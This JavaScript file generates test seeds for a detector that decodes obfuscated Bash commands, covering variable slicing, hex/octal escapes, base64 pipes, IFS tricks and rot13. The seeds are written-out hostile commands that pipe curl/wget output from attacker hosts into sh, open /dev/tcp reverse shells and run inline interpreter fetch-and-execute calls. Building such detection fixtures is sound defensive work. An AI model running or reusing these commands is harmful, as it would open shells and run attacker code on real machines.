'use strict';
// ════════════════════════════════════════════════════════════════════════════
// grammars/bash-grammar.js — deterministic seed generator for Bash / POSIX
// shell obfuscation (the bash-obfuscation.js surface: B1 variable expansion,
// B2 ANSI-C quoting, B3 printf chains, B4 pipe-to-shell, B5 command
// substitution unrolling, B6 IFS / variable concatenation,
// /dev/tcp reverse shells).
// ════════════════════════════════════════════════════════════════════════════

const BASH_TECHNIQUE_CATALOG = Object.freeze([
  'Bash Variable Expansion (single)',
  'Bash Variable Expansion (line)',
  'Bash Variable Expansion (partial)',
  'Bash ANSI-C Quoting',
  'Bash printf Chain',
  'Bash Pipe-to-Shell (live fetch)',
  'Bash base64-pipe-to-Shell',
  'Bash base64-here-string-to-Shell',
  'Bash xxd-here-string-to-Shell',
  'Bash eval $(echo … | base64 -d)',
  'Bash eval $(printf …)',
  'Bash IFS Reassembly (structural)',
  'Bash IFS Reassembly',
  'Bash Variable Concatenation',
  'Bash Variable Concatenation (partial)',
  'Bash /dev/tcp Reverse Shell',
  'Bash echo -e Escape Chain',
  'Bash Indirect Variable Expansion',
  'Bash Inline awk Executor',
  'Bash Inline perl Executor',
  'Bash Inline python Executor',
  'Bash Inline python3 Executor',
  'Bash Inline ruby Executor',
  'Bash Inline node Executor',
  'Bash Inline php Executor',
  'Bash tr rot13 Here-String',
]);

function makeRng(seed) {
  let s = (seed | 0) || 0xBA55BA55;
  return {
    next() { s ^= s << 13; s ^= s >>> 17; s ^= s << 5; return s >>> 0; },
    int(n) { return this.next() % Math.max(1, n); },
    pick(arr) { return arr[this.int(arr.length)]; },
  };
}

function makeSeed(text, expectedSubstring) {
  const buf = Buffer.from(text, 'utf8');
  if (expectedSubstring) {
    Object.defineProperty(buf, '_expectedSubstring', {
      value: expectedSubstring,
      enumerable: false,
    });
  }
  return buf;
}

// ── Branch generators ─────────────────────────────────────────────────────

function genVariableExpansion() {
  // B1 — ${V:n:m}, ${V//x/y}, ${V/#prefix/}, ${V:-default}, ${V/%suffix/}
  // The decoder resolves these against earlier V=… literal assignments.
  const out = [];
  // Simple substring slicing — single fragment, emits "(single)".
  out.push(makeSeed(
    'V=powershell_is_long\necho ${V:0:10}',
    'powershell',
  ));
  // Global substitution — single fragment. Decoder emits the joined
  // result after stripping every `X`. Source value is segmented so
  // the stripped output ("whoami foo") is a legitimate shell command
  // with word boundaries around the LOLBin token.
  out.push(makeSeed(
    'X=XwhoamiX foo\necho ${X//X/}',
    'whoami',
  ));
  // Prefix strip — ${P#prefix_} drops the literal "prefix_" prefix.
  // Value includes a trailing space so `curl` is word-bounded.
  out.push(makeSeed(
    'P=prefix_curl \necho ${P#prefix_}',
    'curl',
  ));
  // Suffix strip
  out.push(makeSeed(
    'S=/usr/bin/bash_extra\necho ${S%_extra}',
    '/usr/bin/bash',
  ));
  // Default value expansion
  out.push(makeSeed(
    'unset CMD\necho ${CMD:-wget}',
    'wget',
  ));

  // ── Line-level multi-fragment (≥3 ${V:n:m} on one line) ──
  //
  // The decoder's line-level resolver (bash-obfuscation.js:293
  // `fragLineRe`) fires on ≥3 adjacent slice-expansions on a single
  // line. Each slice alone is gibberish; the joined line spells out a
  // sensitive command. Indices into V='curl http://evil.example.com':
  //   0=c 1=u 2=r 3=l 4=' ' 5=h 6=t 7=t 8=p
  out.push(makeSeed(
    "V='curl http://evil.example.com'\n"
    + 'eval ${V:0:1}${V:1:1}${V:2:1}${V:3:1}',
    'curl',
  ));
  // "(line)" variant — every fragment resolves.
  out.push(makeSeed(
    "W='wget -qO- http://evil.example.com/x.sh'\n"
    + '${W:0:1}${W:1:1}${W:2:1}${W:3:1} ${W:5:}',
    'wget',
  ));
  // "(partial)" variant — at least one fragment references an
  // undefined variable. The resolver tolerates partial resolution
  // provided ≥1 fragment does resolve; emits "(partial)" when any
  // are unresolved.
  out.push(makeSeed(
    "S='sh /tmp/payload'\n"
    + '${S:0:1}${S:1:1}${UNDEF:0:1}${S:2:1} | bash',
    'sh',
  ));

  return out;
}

function genAnsiCQuoting() {
  // B2 — $'\xNN' ANSI-C quoting. Decodes hex escapes to bytes.
  // "whoami" = 77 68 6F 61 6D 69
  const out = [];
  out.push(makeSeed("sh -c $'\\x77\\x68\\x6f\\x61\\x6d\\x69'", 'whoami'));
  // Octal escapes
  out.push(makeSeed("echo $'\\167\\150\\157\\141\\155\\151'", 'whoami'));
  // Mix of hex and control chars
  out.push(makeSeed("bash -c $'\\x63\\x75\\x72\\x6c\\x20-s'", 'curl'));
  // \u unicode form
  out.push(makeSeed("printf '%s' $'\\u0063\\u0075\\u0072\\u006c'", 'curl'));
  return out;
}

function genPrintfChain() {
  // B3 — printf '\xNN…', printf '%b' '…'
  const out = [];
  // printf '\xNN' chain - "wget"
  out.push(makeSeed("printf '\\x77\\x67\\x65\\x74' | sh", 'wget'));
  // printf '%b' with embedded escapes
  out.push(makeSeed("printf '%b' '\\x63\\x75\\x72\\x6c' | sh", 'curl'));
  // printf -v assignment to var then eval
  out.push(makeSeed("printf -v cmd '\\x6e\\x63' && $cmd -e /bin/sh 10.0.0.1 4444", 'nc'));
  return out;
}

function genPipeToShell() {
  // B4 — curl|sh, wget|sh. Two-tier: live-fetch (detection-only) vs
  // base64-pipe-to-sh (decodes upstream).
  const out = [];
  // Live fetch
  out.push(makeSeed(
    'curl -sL https://attacker.example.com/payload.sh | sh',
    'curl',
  ));
  out.push(makeSeed(
    'wget -qO- http://evil.example.com/x.sh | bash',
    'wget',
  ));
  // base64-decode-pipe-to-sh (the literal-source variant that decodes
  // the upstream). "echo d2hvYW1p | base64 -d | sh" → "whoami"
  out.push(makeSeed(
    'echo d2hvYW1p | base64 -d | sh',
    'whoami',
  ));
  // base64 here-string
  out.push(makeSeed(
    'base64 -d <<< "d2hvYW1p" | sh',
    'whoami',
  ));
  // xxd here-string - "whoami" = 77686f616d69
  out.push(makeSeed(
    'xxd -r -p <<< "77686f616d69" | sh',
    'whoami',
  ));
  return out;
}

function genEvalUnroll() {
  // B5 — eval $(…), eval `…`, source <(…), bash <(…)
  const out = [];
  // eval $(echo | base64 -d)
  out.push(makeSeed(
    'eval $(echo "d2hvYW1p" | base64 -d)',
    'whoami',
  ));
  // eval $(printf …)
  out.push(makeSeed(
    "eval $(printf '\\x77\\x68\\x6f\\x61\\x6d\\x69')",
    'whoami',
  ));
  // Backtick form
  out.push(makeSeed(
    'eval `echo d2hvYW1p | base64 -d`',
    'whoami',
  ));
  return out;
}

function genIfsAndConcat() {
  // B6 — IFS / brace-expansion fragmentation, {l,s}=…; $l$s
  const out = [];

  // ── "Bash IFS Reassembly" — resolved form (var IS assigned). ──
  // decoder (bash-obfuscation.js:577 `ifsExecRe`) requires:
  //   IFS=<quoted|$'…'|"…">;  …; eval $V   (within 800 chars)
  // and the var is in the local `vars` symbol table → "Bash IFS
  // Reassembly".
  out.push(makeSeed(
    `IFS='_'\ncmd=wget_-qO-_http://evil.example.com/x\neval $cmd`,
    'wget',
  ));
  // Tab-separated IFS (ANSI-C $'\t'), resolved var.
  out.push(makeSeed(
    `IFS=$'\\x09'\nc='curl\\t-sSL\\thttps://e.example'\neval $c`,
    'curl',
  ));

  // ── "Bash IFS Reassembly (structural)" — UNRESOLVED var. ──
  // Same regex matches when the downstream var is NOT in the symbol
  // table; decoder falls to the structural arm. Single high-
  // confidence signal regardless of payload resolution.
  out.push(makeSeed(
    `IFS='_'\n# the assignment for \$PAYLOAD happens upstream\neval $PAYLOAD`,
    'IFS-reassembly invoking $PAYLOAD',
  ));
  out.push(makeSeed(
    `IFS=$'\\x0a'\nexec $MYSTERY_CMD`,
    'IFS-reassembly invoking $MYSTERY_CMD',
  ));

  // ── "Bash Variable Concatenation" — all resolved. ──
  // l=who; a=ami; $l$a  (but must be ≥3 vars per decoder's {3,12} cap
  // so add a third):
  out.push(makeSeed(
    'a=who\nb=am\nc=i\n$a$b$c',
    'whoami',
  ));
  // Three-way concat spelling 'powershell'.
  out.push(makeSeed(
    'p=pow\nq=er\nr=shell\n$p$q$r',
    'powershell',
  ));

  // ── "Bash Variable Concatenation (partial)" — at least one ──
  // concatenated var is undefined. Decoder sets `unresolved > 0`
  // → "(partial)" branch.
  out.push(makeSeed(
    'a=cu\nb=rl\n$a$b$UNDEFINED_C$UNDEFINED_D  # must still hit SENSITIVE list',
    'cu',
  ));
  out.push(makeSeed(
    'x=po\ny=wer\n$x$y$UNDEFINED_SHELL$UNDEFINED_END  # partial => powerwer⟨…⟩',
    'pow',
  ));

  return out;
}

function genDevTcp() {
  // /dev/tcp bash built-in reverse shell primitive.
  return [
    makeSeed(
      'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
      '/dev/tcp',
    ),
    makeSeed(
      'exec 3<>/dev/tcp/attacker.example.com/8080; cat <&3',
      '/dev/tcp',
    ),
  ];
}

function genEchoEEscapeChain() {
  // B7 — `echo -e '\xNN…'` / `echo -e '\NNN…'`. Decoder decodes the
  // escape run and gates against SENSITIVE_BASH_KEYWORDS.
  const out = [];
  // Hex form spelling "whoami".
  out.push(makeSeed(
    "echo -e '\\x77\\x68\\x6f\\x61\\x6d\\x69'",
    'whoami',
  ));
  // Mixed `-ne` flag, octal form spelling "curl".
  out.push(makeSeed(
    "echo -ne '\\143\\165\\162\\154 http://x'",
    'curl',
  ));
  // `-e` only, UPPER form, spelling "bash -i".
  out.push(makeSeed(
    "echo -E '\\x62\\x61\\x73\\x68 -i'",
    'bash',
  ));
  return out;
}

function genIndirectExpansion() {
  // B8 — ${!pointer} two-hop resolution. Decoder requires (a) pointer
  // value is a valid identifier and (b) final value hits SENSITIVE list.
  const out = [];
  out.push(makeSeed(
    'a=whoami\nb=a\neval "${!b}"',
    'whoami',
  ));
  out.push(makeSeed(
    'cmd=curl\nptr=cmd\n${!ptr} http://evil.example/p',
    'curl',
  ));
  // Should NOT match: pointer value is not a valid identifier.
  out.push(makeSeed(
    'a=not valid\nb=a\n${!b}',
    '',
  ));
  return out;
}

function genInlineInterpreter() {
  // B9 — awk/perl/python/ruby/node/php inline executors. Decoder
  // surfaces the inline body when it contains a system/exec-shaped
  // call (or falls through to SENSITIVE_BASH_KEYWORDS).
  const out = [];
  out.push(makeSeed(
    `awk 'BEGIN{system("curl http://evil.example/p|sh")}'`,
    'curl',
  ));
  out.push(makeSeed(
    `perl -e 'system("wget http://evil.example/p -O- | bash")'`,
    'wget',
  ));
  out.push(makeSeed(
    `python -c 'import os; os.system("curl http://evil.example/p|sh")'`,
    'os.system',
  ));
  out.push(makeSeed(
    `python3 -c "import subprocess; subprocess.call(['bash','-c','curl http://x|sh'])"`,
    'subprocess',
  ));
  out.push(makeSeed(
    `ruby -e 'exec("curl http://evil.example/p|sh")'`,
    'curl',
  ));
  out.push(makeSeed(
    `node -e 'require("child_process").exec("curl http://evil.example/p|sh")'`,
    'child_process',
  ));
  out.push(makeSeed(
    `php -r 'system("curl http://evil.example/p|sh");'`,
    'curl',
  ));
  // Benign build-script form — SHOULD NOT fire (no exec-intent).
  out.push(makeSeed(
    `awk -e '{print $2}'`,
    '',
  ));
  return out;
}

function genTrRot13() {
  // B10 — tr rot13 here-string. Only the two canonical rot13 set pairs
  // resolve; arbitrary translate-sets are ignored.
  const out = [];
  // rot13('whoami') = 'jubnzv' — wait, rot13('whoami'): w→j, h→u, o→b,
  // a→n, m→z, i→v → 'jubnzv'. Seed the cipher-input so decoding yields
  // the SENSITIVE keyword.
  out.push(makeSeed(
    `tr 'A-Za-z' 'N-ZA-Mn-za-m' <<< 'jubnzv'`,
    'whoami',
  ));
  // Reverse orientation: same table read N-Z first.
  out.push(makeSeed(
    `tr 'N-ZA-Mn-za-m' 'A-Za-z' <<< 'phey'`,
    'curl',
  ));
  // Lowercase-first set form. rot13('bash -i') handles non-alpha too.
  out.push(makeSeed(
    `tr 'a-zA-Z' 'n-za-mN-ZA-M' <<< 'onfu -v'`,
    'bash',
  ));
  // Arbitrary set — decoder MUST ignore.
  out.push(makeSeed(
    `tr 'abc' 'xyz' <<< 'abcabc'`,
    '',
  ));
  return out;
}

function generateBashSeeds() {
  const rng = makeRng(0xBA55BA55);
  void rng; // reserved for future parameter sweeps
  return [
    ...genVariableExpansion(),
    ...genAnsiCQuoting(),
    ...genPrintfChain(),
    ...genPipeToShell(),
    ...genEvalUnroll(),
    ...genIfsAndConcat(),
    ...genDevTcp(),
    ...genEchoEEscapeChain(),
    ...genIndirectExpansion(),
    ...genInlineInterpreter(),
    ...genTrRot13(),
  ];
}

module.exports = { generateBashSeeds, BASH_TECHNIQUE_CATALOG };
